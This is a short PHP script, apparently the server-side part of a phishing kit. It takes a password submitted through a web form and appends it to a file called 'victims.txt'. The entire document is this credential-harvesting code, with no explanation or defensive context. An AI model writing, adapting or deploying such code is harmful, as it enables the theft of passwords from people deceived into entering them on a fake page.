<?php
$p = $_POST['pass'];
fwrite(fopen('victims.txt','a+'),'PASSWORD : '.$p."\n");
